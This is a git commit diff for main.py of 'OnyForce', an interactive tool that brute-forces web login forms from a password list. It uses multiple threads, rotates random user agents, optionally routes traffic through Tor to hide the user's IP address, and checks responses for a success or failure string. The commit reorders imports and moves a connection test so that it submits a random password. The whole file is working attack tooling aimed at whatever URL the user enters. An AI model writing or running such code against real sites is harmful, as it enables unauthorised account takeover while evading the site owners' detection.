72f4c63cf0f39139170dcfc428b571f9c76ea2ac
Zeid Asseh <zaid.2007ilovxbox@gmail.com>
2024-04-22 05:45:00 -0400

    Some Improvements

--- main.py
+++ main.py
@@ -1,34 +1,33 @@
 #!/usr/bin/env python3
 
-import os
-import questionary
-import colorama
-import requests
 import logging
+import os
+import random
 import sys
+from multiprocessing import cpu_count
+from time import sleep
 
+import colorama
+import questionary
+import requests
+from fake_useragent import UserAgent
 
 from dependincies import create_tor
 from dependincies import start_attack
 
-from fake_useragent import UserAgent
-from time import sleep
-from multiprocessing import cpu_count
-
-
 logging.getLogger("urllib3").setLevel(logging.WARNING)
 if len(sys.argv) == 2:
     if sys.argv[1] == '--debug' or sys.argv[1] == '-d':
-        logging.basicConfig(level=logging.DEBUG, format=f'[{colorama.Fore.MAGENTA + colorama.Style.BRIGHT}%(funcName)s %(levelname)s{colorama.Fore.RESET + colorama.Style.RESET_ALL + colorama.Back.RESET}] [%(asctime)s, %(lineno)d] %(message)s')
+        logging.basicConfig(level=logging.DEBUG,
+                            format=f'[{colorama.Fore.MAGENTA + colorama.Style.BRIGHT}%(funcName)s %(levelname)s{colorama.Fore.RESET + colorama.Style.RESET_ALL + colorama.Back.RESET}] [%(asctime)s, %(lineno)d] %(message)s')
 
     else:
-        logging.basicConfig(level=logging.DEBUG, format=f'[{colorama.Fore.MAGENTA + colorama.Style.BRIGHT}%(funcName)s %(levelname)s{colorama.Fore.RESET + colorama.Style.RESET_ALL + colorama.Back.RESET}] [%(asctime)s, %(lineno)d] %(message)s')
+        logging.basicConfig(level=logging.DEBUG,
+                            format=f'[{colorama.Fore.MAGENTA + colorama.Style.BRIGHT}%(funcName)s %(levelname)s{colorama.Fore.RESET + colorama.Style.RESET_ALL + colorama.Back.RESET}] [%(asctime)s, %(lineno)d] %(message)s')
 
 else:
     logging.basicConfig(level=logging.INFO,
                         format=f'[{colorama.Fore.MAGENTA + colorama.Style.BRIGHT}%(funcName)s{colorama.Fore.RESET + colorama.Style.RESET_ALL + colorama.Back.RESET} %(levelname)s] [%(asctime)s, %(lineno)d] %(message)s')
-
-
 
 os.system('cls||clear')
 os.system('figlet "OnyForce" | lolcat')
@@ -44,7 +43,6 @@ WHITE = colorama.Fore.WHITE
 RUNNING = 1
 
 
-
 def get_header_with_random_user_agent():
     ua = UserAgent()
     headers = {
@@ -52,8 +50,6 @@ def get_header_with_random_user_agent():
     }
 
     return headers
-
-
 
 
 while RUNNING:
@@ -68,57 +64,25 @@ while RUNNING:
         logging.error(RED + BRIGHT + 'Please input a number' + RESET)
         continue
 
-
     tor: bool = bool(questionary.confirm('Do you want to use TOR to mask your IP address').ask())
     if tor:
-
         create_tor.Make_tor_processes(number_of_threads)
         tor_ports = [i + 10000 for i in range(number_of_threads)]
         sleep(2)
         print()
 
-    indicator: str = questionary.text('A text in the website that indicates a successful / unsuccessful attempt, For example uIncorrect / sCorrect: ').ask()
+    indicator: str = questionary.text(
+        'A text in the website that indicates a successful / unsuccessful attempt, For example uIncorrect / sCorrect: ').ask()
 
     if not indicator.startswith('u') and not indicator.startswith('s'):
-        logging.error(RED + BRIGHT + 'Indicator must start with an s for messages that appear when successful and u for messages that appear when unsuccessful' + RESET)
+        logging.error(
+            RED + BRIGHT + 'Indicator must start with an s for messages that appear when successful and u for messages that appear when unsuccessful' + RESET)
         continue
 
     url: str = questionary.text('The URL of the form you wish to attack: ').ask()
-    logging.debug('Checking connection to website')
-    try:
-        if tor:
-            response = requests.post(url, data={'Some': 'random', 'data': 'for_testing'}, timeout=10,
-                                     headers=get_header_with_random_user_agent(), verify=False,
-                                     proxies={'http': f'socks5h://127.0.0.1:{tor_ports[0]}', 'https': f'socks5h://127.0.0.1:{tor_ports[0]}'})
 
-        else:
-            response = requests.post(url, data={'Some': 'random', 'data': 'for_testing'}, timeout=10,
-                                     headers=get_header_with_random_user_agent(), verify=False)
-
-
-        if indicator.startswith('u') and indicator.replace('u', '') not in response.text:
-            print()
-            logging.error(f'{RED}{BRIGHT}While trying to test the connection to the URL you provided ({url}) it seems that the conditional statement ({indicator.replace("u", "")}) that you provided is not in the website which should mean the script made a successful attempt in logging in but it did not, that either means if you are using TOR that the website blocks TOR or you misconfigured the script please check and try again.{RESET}')
-            RUNNING = 0
-            break
-
-        elif response.status_code == 200:
-            pass
-
-
-        else:
-            if bool(questionary.confirm(f'The website returned a non-valid status code "{response.status_code}" which if you are using TOR could mean that the website is blocking your requests, do you wish to continue anyway?').ask()):
-                pass
-            else:
-                RUNNING = 0
-                break
-
-    except requests.ConnectionError:
-        logging.error(f'{RED}{BRIGHT}Connection to {url} timed-out terminating.{RESET}')
-        exit(1)
-
-    fields = questionary.text('The field(s) that are required to form the request with their value separated by column (:), if more than one please separate them by a comma if none press enter (without the one that is going to be attacked): ').ask()
-
+    fields = questionary.text(
+        'The field(s) that are required to form the request with their value separated by column (:), if more than one please separate them by a comma if none press enter (without the one that is going to be attacked): ').ask()
 
     if not fields:
         fields_dictionary = {}
@@ -136,21 +100,58 @@ while RUNNING:
             fields_dictionary[key] = value
         logging.debug(fields_dictionary)
 
-
-
-
     field_to_attack = questionary.text('The field you wish to brute-force: ').ask()
     if not field_to_attack:
         logging.error(f'{RED}{BRIGHT}Please specify the field to attack{RESET}')
         continue
 
-
     with open(file_path, 'r', errors='ignore') as p:
         passwords = p.readlines()
         passwords = [password.strip() for password in passwords]
+
+    logging.debug('Checking connection to website')
+    try:
+        rand_fields = fields_dictionary
+        rand_fields[field_to_attack] = passwords[random.randint(0, len(passwords) - 1)]
+        logging.debug(f'Checking connection with the random fields {rand_fields}')
+
+        if tor:
+            response = requests.post(url, data=rand_fields, timeout=10,
+                                     headers=get_header_with_random_user_agent(), verify=False,
+                                     proxies={'http': f'socks5h://127.0.0.1:{tor_ports[0]}',
+                                              'https': f'socks5h://127.0.0.1:{tor_ports[0]}'})
+
+        else:
+            response = requests.post(url, data=rand_fields, timeout=10,
+                                     headers=get_header_with_random_user_agent(), verify=False)
+
+        if indicator.startswith('u') and indicator.replace('u', '') not in response.text:
+            print()
+            logging.error(
+                f'{RED}{BRIGHT}While trying to test the connection to the URL you provided ({url}) it seems that the conditional statement ({indicator.replace("u", "")}) that you provided is not in the website which should mean the script made a successful attempt in logging in but it did not, that either means if you are using TOR that the website blocks TOR or you misconfigured the script please check and try again.{RESET}')
+            RUNNING = 0
+            break
+
+        elif response.status_code == 200:
+            pass
+
+
+        else:
+            if bool(questionary.confirm(
+                    f'The website returned a non-valid status code "{response.status_code}" which if you are using TOR could mean that the website is blocking your requests or that the website is down, do you wish to continue anyway?').ask()):
+                pass
+            else:
+                RUNNING = 0
+                break
+
+    except requests.ConnectionError:
+        logging.error(f'{RED}{BRIGHT}Connection to {url} timed-out terminating.{RESET}')
+        exit(1)
+
+    logging.debug('Deleting random fields')
+    del rand_fields
 
     Attack = start_attack.Initiate_attack(tor, fields_dictionary, field_to_attack, url, indicator,
                                           number_of_threads - 1, passwords)
     Attack.create_threads()
     break
-
